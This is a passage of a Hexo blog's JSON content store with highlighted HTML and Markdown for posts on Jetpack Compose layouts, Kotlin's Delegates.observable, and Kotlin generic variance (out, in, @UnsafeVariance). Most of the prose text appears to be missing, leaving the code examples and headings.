class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>bottom <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                            modifier <span class=\"token operator\">=</span> Modifier\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            horizontalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterHorizontally\n                        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                            <span class=\"token function\">Card</span><span class=\"token punctuation\">(</span>\n                                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>horizontal <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                                <span class=\"token function\">Button</span><span class=\"token punctuation\">(</span>\n                                    onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">/*TODO*/</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                                    elevation <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    colors <span class=\"token operator\">=</span> ButtonDefaults<span class=\"token punctuation\">.</span><span class=\"token function\">buttonColors</span><span class=\"token punctuation\">(</span>\n                                        backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Transparent\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">.</span>sp<span class=\"token punctuation\">,</span>\n                                            color <span class=\"token operator\">=</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF229DD5</span><span class=\"token punctuation\">)</span>\n                                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">&#125;</span>\n                            <span class=\"token punctuation\">&#125;</span>\n                        <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>\n        icon<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        text<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        color<span class=\"token operator\">:</span> Color\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n            Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// icon</span>\n            <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>end <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                    painter <span class=\"token operator\">=</span> <span class=\"token function\">painterResource</span><span class=\"token punctuation\">(</span>id <span class=\"token operator\">=</span> icon<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">background</span><span class=\"token punctuation\">(</span>color<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    colorFilter <span class=\"token operator\">=</span> ColorFilter<span class=\"token punctuation\">.</span><span class=\"token function\">tint</span><span class=\"token punctuation\">(</span>Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                text <span class=\"token operator\">=</span> text<span class=\"token punctuation\">,</span>\n                style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                    fontSize <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">.</span>sp\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@Preview</span>\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Preview</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>Compose</p>\n<p><img src=\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg\"></p>\n"},{"title":"Kotlin","date":"2021-12-17T16:00:00.000Z","author":"","hide":false,"summary":"LiveData","_content":"\n# Kotlin\n\n\n\n~~~kotlin\nclass User {\n    var name: String by Delegates.observable(\"\") { prop, old, new ->\n        println(\"$old -> $new\")\n    }\n}\n~~~\n\nRxJavaFlowLiveData\n\nLiveDataMVVM\n\nLiveDataKotlinRxJavaFlow","source":"_posts/kotlin-delegates-observable.md","raw":"---\ntitle: Kotlin\ndate: 2021-12-18\nauthor: \nhide: false\nsummary: LiveData\ncategories: \ntags:\n  - Kotlin\n  - \n---\n\n# Kotlin\n\n\n\n~~~kotlin\nclass User {\n    var name: String by Delegates.observable(\"\") { prop, old, new ->\n        println(\"$old -> $new\")\n    }\n}\n~~~\n\nRxJavaFlowLiveData\n\nLiveDataMVVM\n\nLiveDataKotlinRxJavaFlow","slug":"kotlin-delegates-observable","published":1,"updated":"2022-11-24T02:56:35.966Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtn001qsfkl05h6fhhk","content":"<h1 id=\"Kotlin\"><a href=\"#Kotlin\" class=\"headerlink\" title=\"Kotlin\"></a>Kotlin</h1><p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> User <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> name<span class=\"token operator\">:</span> String <span class=\"token keyword\">by</span> Delegates<span class=\"token punctuation\">.</span><span class=\"token function\">observable</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> prop<span class=\"token punctuation\">,</span> old<span class=\"token punctuation\">,</span> new <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token interpolation variable\">$old</span> -&gt; <span class=\"token interpolation variable\">$new</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>RxJavaFlowLiveData</p>\n<p>LiveDataMVVM</p>\n<p>LiveDataKotlinRxJavaFlow</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Kotlin\"><a href=\"#Kotlin\" class=\"headerlink\" title=\"Kotlin\"></a>Kotlin</h1><p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> User <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> name<span class=\"token operator\">:</span> String <span class=\"token keyword\">by</span> Delegates<span class=\"token punctuation\">.</span><span class=\"token function\">observable</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> prop<span class=\"token punctuation\">,</span> old<span class=\"token punctuation\">,</span> new <span class=\"token operator\">-></span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token interpolation variable\">$old</span> -> <span class=\"token interpolation variable\">$new</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>RxJavaFlowLiveData</p>\n<p>LiveDataMVVM</p>\n<p>LiveDataKotlinRxJavaFlow</p>\n"},{"title":"Kotlin /","date":"2021-11-12T16:00:00.000Z","author":"","hide":false,"summary":"Kotlin/","_content":"\n# Kotlin /\n\n## \n\n### \n\n: StudentPerson\n\nData\\<T>(val data: T)\n\ntestData\\<Person>,Data\\<Student>\n\ntest\n\nData\\<Student>Data\\<Person>\n\nList\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\nclass Data<T>(val data: T)\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) // \n    test(studentList) // \n}\n~~~\n\n\n\nList\n\nJava StudentPersonSimpleDataSimpleData \n\ncrossinlineT)\n\n: \n\n> MyClassA BMyClass<A>MyClass<B>MyClassT\n\n### \n\nout\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n// out\nclass Data<out T>(val data: T) {\n\n    // \n    // \n    var value: T = TODO()\n    // \n    private var value2: T = TODO()\n    // \n    val value3: T = TODO()\n\n    // \n    // \n    fun func(input: T) {\n        TODO()\n    }\n\n    // \n    fun func(): T {\n        TODO()\n    }\n}\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) //  \n    test(studentList) // \n}\n~~~\n\n## \n\nData\\<Student>Data\\<Person>\n\n\n\n**** ()\n\n### \n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n\ninterface Transformer<in T> {\n    fun transform(t: T): String\n}\n\nfun main() {\n    val trans = object : Transformer<Person> {\n        override fun transform(t: Person): String {\n            return t.name\n        }\n    }\n    handleTransformer(trans) //  \n}\n\nfun handleTransformer(trans: Transformer<Student>) {\n    val student = Student(\"Tom\", 6)\n    val result = trans.transform(student)\n}\n\n~~~\n\n\n\n## @UnsafeVariance\n\n/\n\n****\n\n\n\n### \n\n~~~kotlin\nclass Data<out T>(val data: T) {\n\n    // \n    // @UnsafeVariance\n    var value: @UnsafeVariance T = TODO()\n    // \n    private var value2: T = TODO()\n    // \n    val value3: T = TODO()\n\n    // \n    // @UnsafeVariance\n    fun func(input: @UnsafeVariance T) {\n        TODO()\n    }\n\n    // \n    fun func(): T {\n        TODO()\n    }\n}\n~~~\n\n\n\n","source":"_posts/kotlin-generics-covariation-and-inversion.md","raw":"---\ntitle: Kotlin /\ndate: 2021-11-13\nauthor: \nhide: false\nsummary: Kotlin/\ncategories: \ntags:\n  - Kotlin\n---\n\n# Kotlin /\n\n## \n\n### \n\n: StudentPerson\n\nData\\<T>(val data: T)\n\ntestData\\<Person>,Data\\<Student>\n\ntest\n\nData\\<Student>Data\\<Person>\n\nList\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\nclass Data<T>(val data: T)\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) // \n    test(studentList) // \n}\n~~~\n\n\n\nList\n\nJava StudentPersonSimpleDataSimpleData \n\ncrossinlineT)\n\n: \n\n> MyClassA BMyClass<A>MyClass<B>MyClassT\n\n### \n\nout\n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n// out\nclass Data<out T>(val data: T) {\n\n    // \n    // \n    var value: T = TODO()\n    // \n    private var value2: T = TODO()\n    // \n    val value3: T = TODO()\n\n    // \n    // \n    fun func(input: T) {\n        TODO()\n    }\n\n    // \n    fun func(): T {\n        TODO()\n    }\n}\n\nfun test(people: List<Person>) {\n    TODO()\n}\n\nfun test(people: Data<Person>) {\n    TODO()\n}\n\nfun main() {\n    val studentList = arrayListOf(\n        Student(\"xxx\", 6),\n        Student(\"xxx\", 6)\n    )\n    val data = Data(Student(\"xxx\", 6))\n    test(data) //  \n    test(studentList) // \n}\n~~~\n\n## \n\nData\\<Student>Data\\<Person>\n\n\n\n**** ()\n\n### \n\n~~~kotlin\nopen class Person(val name: String)\nclass Student(name: String, val level: Int) : Person(name)\n\ninterface Transformer<in T> {\n    fun transform(t: T): String\n}\n\nfun main() {\n    val trans = object : Transformer<Person> {\n        override fun transform(t: Person): String {\n            return t.name\n        }\n    }\n    handleTransformer(trans) //  \n}\n\nfun handleTransformer(trans: Transformer<Student>) {\n    val student = Student(\"Tom\", 6)\n    val result = trans.transform(student)\n}\n\n~~~\n\n\n\n## @UnsafeVariance\n\n/\n\n****\n\n\n\n### \n\n~~~kotlin\nclass Data<out T>(val data: T) {\n\n    // \n    // @UnsafeVariance\n    var value: @UnsafeVariance T = TODO()\n    // \n    private var value2: T = TODO()\n    // \n    val value3: T = TODO()\n\n    // \n    // @UnsafeVariance\n    fun func(input: @UnsafeVariance T) {\n        TODO()\n    }\n\n    // \n    fun func(): T {\n        TODO()\n    }\n}\n~~~\n\n\n\n","slug":"kotlin-generics-covariation-and-inversion","published":1,"updated":"2022-11-24T02:52:06.426Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jto001ssfkl54o8fl99","content":"<h1 id=\"Kotlin--x2F-\"><a href=\"#Kotlin--x2F-\" class=\"headerlink\" title=\"Kotlin /\"></a>Kotlin /</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>: StudentPerson</p>\n<p>Data&lt;T&gt;(val data: T)</p>\n<p>testData&lt;Person&gt;,Data&lt;Student&gt;</p>\n<p>test</p>\n<p>Data&lt;Student&gt;Data&lt;Person&gt;</p>\n<p>List</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// </span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// </span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>List</p>\n<p>Java StudentPersonSimpleDataSimpleData </p>\n<p>crossinlineT)</p>\n<p>: </p>\n<blockquote>\n<p>MyClassA BMyClass<a>MyClass<b>MyClassT</b></a></p><a><b>\n</b></a></blockquote><a><b>\n</b></a><b><h3 id=\"\"><a></a><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>out</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// out</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n   